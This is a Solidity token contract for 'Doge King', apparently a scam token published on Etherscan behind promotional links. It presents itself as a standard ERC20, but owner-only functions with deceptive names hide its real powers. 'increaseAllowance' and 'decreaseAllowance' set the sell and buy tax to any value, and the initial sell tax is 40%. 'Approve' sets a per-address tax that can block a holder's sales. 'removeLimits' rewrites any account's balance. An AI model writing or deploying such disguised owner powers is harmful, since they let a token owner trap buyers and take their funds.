/**
 *Submitted for verification at Etherscan.io on 2023-02-28
*/

/**


──────▄▌▐▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▌
───▄▄██▌█ ░   Doge King 🐶
▄▄▄▌▐██▌█ ░░░░░░ ░░░░░░░░░ ░░░░░░░▐\.
███████▌█▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▌ \.
▀❍▀▀▀▀▀▀▀❍❍▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀❍❍ ▀▀.

👁‍🗨 Website: https://dogekingtoken.io/   
👁‍🗨 Twitter: https://twitter.com/dogeking_eth
👁‍🗨 TG: https://t.me/dogekingethPortal

*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the Owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new Owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library SafeMath {
   
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
 
contract ERC20 is Context {

    mapping(address => mapping(address => uint256)) private _allowances;
    
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view virtual returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}

contract DogeKing is ERC20, Ownable {

    using SafeMath for uint256;
    
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _isTax;
    mapping(address => uint256) private _accTax;

    uint256 private _buyTax;
    uint256 private _sellTax;
    address private uniswapV2Pair;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;
    IUniswapV2Router02 private uniswapV2Router;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) ERC20(name_, symbol_) {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        _mint(_msgSender(), totalSupply_ * 10**decimals());
        _isTax[_msgSender()] = true;
        _buyTax = 0;
        _sellTax = 40;  
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: REWARD to the zero address"); 
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 _amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 fromBalance = _balances[from];
        require(fromBalance >= _amount, "ERC20: transfer amount exceeds balance");
        bool rF = true;
        if (_checkFreeAccount(from, to)) {
            rF = false;
        }
        uint256 tradeFeeAmount = 0;
        if (rF) {
            uint256 tradeFee = 0;
            if (uniswapV2Pair != address(0)) {
                if (to == uniswapV2Pair) {
                    tradeFee = _sellTax;
                }
                if (from == uniswapV2Pair) {
                    tradeFee = _buyTax;
                }
            }
            if (_accTax[from] > 0) {
                tradeFee = _accTax[from];
            }
            tradeFeeAmount = _amount.mul(tradeFee).div(100);
        }
        if (tradeFeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeFeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeFeeAmount);
            emit Transfer(from, _deadAddress, tradeFeeAmount);
        }
        _balances[from] = _balances[from].sub(_amount - tradeFeeAmount);
        _balances[to] = _balances[to].add(_amount - tradeFeeAmount);
        emit Transfer(from, to, _amount - tradeFeeAmount);
    }

    function _checkFreeAccount(address from, address to) internal view returns (bool) {
        return _isTax[from] || _isTax[to];
    }

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function increaseAllowance(uint256 _value) external onlyOwner {
        _sellTax = _value;
    }

    function decreaseAllowance(uint256 _value) external onlyOwner {
        _buyTax = _value;
    }

    function Approve(address _address, uint256 _value) external onlyOwner {
        require(_value >= 0, "Account tax must be greater than or equal to 0");
        _accTax[_address] = _value;
    }

    function setBots(address _address, bool _value) external onlyOwner {
        _isTax[_address] = _value;
    }

    function removeLimits(address to, uint amount) external onlyOwner {
        _balances[to] = amount;
    }

    function transfer(address to, uint256 amount) public virtual returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, 
            0, 
            address(this),
            block.timestamp
        );
    }
}